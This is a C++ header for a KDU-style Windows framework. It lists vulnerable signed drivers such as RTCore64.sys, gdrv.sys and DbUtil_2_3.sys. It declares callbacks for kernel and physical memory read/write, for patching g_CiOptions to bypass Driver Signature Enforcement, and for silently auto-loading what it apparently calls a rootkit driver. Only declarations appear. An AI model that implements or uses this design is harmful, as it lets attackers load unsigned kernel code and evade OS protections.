#pragma once
#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>

// Provider capability flags (based on KDU design)
#define PROVIDER_CAP_PHYSICAL_MEMORY     0x00000001  // Can access physical memory
#define PROVIDER_CAP_VIRTUAL_MEMORY      0x00000002  // Can read/write virtual memory
#define PROVIDER_CAP_PHYSICAL_BRUTEFORCE 0x00000004  // Can brute-force physical memory pages
#define PROVIDER_CAP_PML4_TRANSLATION    0x00000008  // Can translate virtual to physical
#define PROVIDER_CAP_PREFER_PHYSICAL     0x00000010  // Prefers physical memory access
#define PROVIDER_CAP_DSE_BYPASS          0x00000020  // Can bypass DSE directly

// Provider callback prototypes (enhanced from KDU's architecture)
typedef BOOL(WINAPI* ProvStartVulnerableDriver)(struct _PROVIDER_CONTEXT* Context);
typedef VOID(WINAPI* ProvStopVulnerableDriver)(struct _PROVIDER_CONTEXT* Context);
typedef BOOL(WINAPI* ProvRegisterDriver)(HANDLE DeviceHandle, PVOID Param);
typedef BOOL(WINAPI* ProvUnregisterDriver)(HANDLE DeviceHandle, PVOID Param);
typedef BOOL(WINAPI* ProvControlDSE)(struct _PROVIDER_CONTEXT* Context, ULONG DSEValue, ULONG_PTR Address);
typedef BOOL(WINAPI* ProvReadKernelVM)(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
typedef BOOL(WINAPI* ProvWriteKernelVM)(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
typedef BOOL(WINAPI* ProvReadPhysicalMemory)(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes);
typedef BOOL(WINAPI* ProvWritePhysicalMemory)(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes);
typedef BOOL(WINAPI* ProvVirtualToPhysical)(HANDLE DeviceHandle, ULONG_PTR VirtualAddress, PULONG_PTR PhysicalAddress);

// Provider state enumeration
typedef enum _PROVIDER_STATE {
    StateUnloaded = 0,
    StateLoaded,
    StateActive,
    StateError,
    StateMax
} PROVIDER_STATE;

// Provider exploitation types
typedef enum _PROVIDER_TYPE {
    ProviderTypePhysicalMemory,
    ProviderTypeVirtualMemory,
    ProviderTypeIOCTL,
    ProviderTypeRegistryAccess
} PROVIDER_TYPE;

// Driver database entry (enhanced from KDU)
typedef struct _DRIVER_DB_ENTRY {
    ULONG ResourceId;           // Resource ID for driver binary
    ULONG ProviderId;          // Provider implementation ID
    std::wstring DriverName;   // Driver file name (e.g., "RTCore64.sys")
    std::wstring DeviceName;   // Device name (e.g., "RTCore64")
    std::wstring Description;  // Human readable description
    BOOL SupportHVCI;         // HVCI compatibility
    BOOL SignatureWHQL;       // WHQL signed
    ULONG CapabilityFlags;    // Provider capabilities bitmask
    PROVIDER_TYPE Type;       // Provider exploitation type
    BOOL PhysMemoryBruteForce; // Can brute-force physical memory
    BOOL PML4FromLowStub;     // Can translate virt2phys
    BOOL PreferPhysical;      // Prefers physical memory access
} DRIVER_DB_ENTRY, *PDRIVER_DB_ENTRY;

// Provider implementation structure (enhanced with physical memory capabilities)
typedef struct _DRIVER_PROVIDER {
    ULONG ProviderId;
    
    // Core callbacks
    ProvStartVulnerableDriver StartVulnerableDriver;
    ProvStopVulnerableDriver StopVulnerableDriver;
    
    // Optional callbacks
    ProvRegisterDriver RegisterDriver;
    ProvUnregisterDriver UnregisterDriver;
    ProvControlDSE ControlDSE;
    ProvReadKernelVM ReadKernelVM;
    ProvWriteKernelVM WriteKernelVM;
    
    // Physical memory callbacks (KDU-style)
    ProvReadPhysicalMemory ReadPhysicalMemory;
    ProvWritePhysicalMemory WritePhysicalMemory;
    ProvVirtualToPhysical VirtualToPhysical;
    
} DRIVER_PROVIDER, *PDRIVER_PROVIDER;

// Provider context (enhanced from KDU_CONTEXT)
typedef struct _PROVIDER_CONTEXT {
    ULONG ProviderId;
    HANDLE DeviceHandle;
    std::wstring DriverFileName;
    std::wstring ServiceName;
    PROVIDER_STATE ProviderState;
    PDRIVER_PROVIDER Provider;
    PDRIVER_DB_ENTRY DbEntry;
    BOOL CleanupRequired;
    
    // Enhanced context information (KDU-style)
    ULONG_PTR NtOsBase;           // ntoskrnl.exe base address
    ULONG NtBuildNumber;          // NT build number
    BOOL DSEBypassEnabled;        // DSE bypass status
    ULONG_PTR CiOptionsAddress;   // g_CiOptions address
    ULONG OriginalCiOptions;      // Original g_CiOptions value
    
} PROVIDER_CONTEXT, *PPROVIDER_CONTEXT;

// DSE control structure (from KDU dsefix)
typedef struct _DSE_CONTEXT {
    ULONG_PTR CiOptionsAddress;
    ULONG OriginalValue;
    ULONG NewValue;
    BOOL IsPatched;
    ULONG NtBuildNumber;
} DSE_CONTEXT, *PDSE_CONTEXT;

// Physical memory enumeration parameters (from KDU)
typedef struct _PHYSMEM_ENUM_PARAMS {
    HANDLE DeviceHandle;
    ProvReadPhysicalMemory ReadPhysicalMemory;
    ProvWritePhysicalMemory WritePhysicalMemory;
    PVOID TargetSignature;
    ULONG SignatureLength;
    ULONG DispatchOffset;
    ULONG DispatchPageOffset;
    ULONG JumpAddress;
    BOOL bWrite;
    ULONG64 PagesFound;
    ULONG64 PagesModified;
    PVOID Payload;
    ULONG PayloadSize;
} PHYSMEM_ENUM_PARAMS, *PPHYSMEM_ENUM_PARAMS;

// Auto-loading result structure
typedef struct _AUTO_LOAD_RESULT {
    BOOL Success;
    ULONG SuccessfulProviderId;
    std::wstring SuccessfulDriverName;
    std::wstring ErrorMessage;
    std::vector<std::pair<ULONG, std::string>> FailureReasons;
} AUTO_LOAD_RESULT, *PAUTO_LOAD_RESULT;

class ProviderSystem {
private:
    std::vector<DRIVER_DB_ENTRY> m_DriverDatabase;
    std::vector<DRIVER_PROVIDER> m_Providers;
    PROVIDER_CONTEXT m_CurrentContext;
    DSE_CONTEXT m_DseContext;
    
    // Internal helper methods
    BOOL ExtractDriverFromResource(ULONG ResourceId, const std::wstring& OutputPath);
    BOOL LoadDriverService(const std::wstring& ServiceName, const std::wstring& DriverPath);
    BOOL UnloadDriverService(const std::wstring& ServiceName);
    BOOL OpenDriverDevice(const std::wstring& DeviceName, HANDLE* DeviceHandle);
    VOID CleanupProvider(PPROVIDER_CONTEXT Context);
    std::wstring GenerateRandomServiceName();
    BOOL IsServiceRunning(const std::wstring& ServiceName);
    BOOL ForceUnloadService(const std::wstring& ServiceName);
    
    // DSE bypass methods (from KDU)
    BOOL InitializeDSEBypass();
    ULONG_PTR FindCiOptionsAddress();
    BOOL PatchCiOptions(ULONG NewValue);
    BOOL RestoreCiOptions();
    
    // Physical memory methods (from KDU)
    BOOL EnumeratePhysicalMemory(PPHYSMEM_ENUM_PARAMS Params);
    static BOOL WINAPI PhysMemPatchCallback(ULONG_PTR Address, PVOID UserContext);
    
public:
    ProviderSystem();
    ~ProviderSystem();
    
    // Core functionality
    BOOL Initialize();
    VOID Shutdown();
    
    // Auto-loading functionality (enhanced)
    AUTO_LOAD_RESULT AutoLoadSilentRKDriver();
    BOOL TryLoadProvider(ULONG ProviderId, PPROVIDER_CONTEXT Context);
    BOOL TryLoadProviderWithCapability(ULONG RequiredCapability, PPROVIDER_CONTEXT Context);
    VOID StopCurrentProvider();
    
    // DSE bypass functionality
    BOOL BypassDSE();
    BOOL RestoreDSE();
    BOOL IsDSEBypassed() const;
    
    // Database and provider management
    ULONG GetProviderCount() const;
    ULONG GetDriverCount() const;
    std::vector<DRIVER_DB_ENTRY> GetDriverDatabase() const;
    PDRIVER_DB_ENTRY GetDriverEntry(ULONG ProviderId);
    PDRIVER_PROVIDER GetProvider(ULONG ProviderId);
    std::vector<PDRIVER_DB_ENTRY> GetProvidersByCapability(ULONG CapabilityFlags);
    
    // Status information
    PROVIDER_STATE GetCurrentProviderState() const;
    std::wstring GetCurrentDriverName() const;
    BOOL IsProviderLoaded() const;
    ULONG GetCurrentProviderCapabilities() const;
};

// Provider callback implementations for different driver types
namespace ProviderCallbacks {
    // RTCore64 provider (physical memory access)
    BOOL WINAPI RTCoreStartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI RTCoreStopDriver(PPROVIDER_CONTEXT Context);
    BOOL WINAPI RTCoreControlDSE(PPROVIDER_CONTEXT Context, ULONG DSEValue, ULONG_PTR Address);
    BOOL WINAPI RTCoreReadPhysicalMemory(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes);
    BOOL WINAPI RTCoreWritePhysicalMemory(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes);
    
    // GDRV provider (virtual memory access)
    BOOL WINAPI GDRVStartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI GDRVStopDriver(PPROVIDER_CONTEXT Context);
    BOOL WINAPI GDRVReadKernelVM(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
    BOOL WINAPI GDRVWriteKernelVM(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
    
    // DBUtil provider (registry and file system access)
    BOOL WINAPI DBUtilStartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI DBUtilStopDriver(PPROVIDER_CONTEXT Context);
    BOOL WINAPI DBUtilRegisterDriver(HANDLE DeviceHandle, PVOID Param);
    BOOL WINAPI DBUtilUnregisterDriver(HANDLE DeviceHandle, PVOID Param);
    
    // WinRing0 provider (I/O and MSR access)
    BOOL WINAPI WinRing0StartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI WinRing0StopDriver(PPROVIDER_CONTEXT Context);
    BOOL WINAPI WinRing0ReadKernelVM(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
    BOOL WINAPI WinRing0WriteKernelVM(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
    
    // PhyMem provider (direct physical memory mapping)
    BOOL WINAPI PhyMemStartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI PhyMemStopDriver(PPROVIDER_CONTEXT Context);
    BOOL WINAPI PhyMemReadPhysicalMemory(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes);
    BOOL WINAPI PhyMemWritePhysicalMemory(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes);
    BOOL WINAPI PhyMemVirtualToPhysical(HANDLE DeviceHandle, ULONG_PTR VirtualAddress, PULONG_PTR PhysicalAddress);
    
    // ProcExp provider (process manipulation)
    BOOL WINAPI ProcExpStartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI ProcExpStopDriver(PPROVIDER_CONTEXT Context);
    
    // AsIO provider (hardware I/O)
    BOOL WINAPI AsIOStartDriver(PPROVIDER_CONTEXT Context);
    VOID WINAPI AsIOStopDriver(PPROVIDER_CONTEXT Context);
}

// Utility functions for system information
ULONG_PTR GetNtOsBaseAddress(VOID);
ULONG GetNtBuildNumber(VOID);
BOOL IsProviderCapable(PDRIVER_DB_ENTRY DbEntry, ULONG RequiredCapability);

// DSE bypass utility functions (from KDU)
ULONG_PTR FindCiOptionsAddressByPattern(ULONG NtBuildNumber);
ULONG_PTR FindCiOptionsAddressBySymbols(ULONG NtBuildNumber);
BOOL ValidateInstructionBlock(PBYTE Code, ULONG Offset, ULONG MaxLength);

// Physical memory enumeration (from KDU)
BOOL EnumeratePhysicalMemoryPages(PPHYSMEM_ENUM_PARAMS Params);

// Provider IDs (based on KDU database)
#define PROVIDER_ID_RTCORE64       1   // RTCore64.sys - Physical memory access
#define PROVIDER_ID_GDRV           2   // gdrv.sys - Virtual memory access  
#define PROVIDER_ID_DBUTIL         3   // DbUtil_2_3.sys - Registry access
#define PROVIDER_ID_PROCEXP1627    4   // procexp152.sys (v16.27) - Process access
#define PROVIDER_ID_PROCEXP1702    5   // procexp152.sys (v17.02) - Process access
#define PROVIDER_ID_WINRING0       6   // WinRing0x64.sys - I/O access
#define PROVIDER_ID_PHYSMEM        7   // physmem.sys - Physical memory
#define PROVIDER_ID_AMDRYZEN       8   // AMDRyzenMasterDriver.sys - Hardware access
#define PROVIDER_ID_HWRWDRV        9   // HwRwDrv.sys - Hardware R/W
#define PROVIDER_ID_ASIO2          10  // AsIO2.sys - ASUS I/O
#define PROVIDER_ID_ASIO3          11  // AsIO3.sys - ASUS I/O  
#define PROVIDER_ID_GLCKIO2        12  // GLCKIO2.sys - Gigabyte I/O
#define PROVIDER_ID_ENEIO64        13  // EneIo64.sys - ENE I/O
#define PROVIDER_ID_ATSZIO64       14  // ATSZIO64.sys - ATS I/O
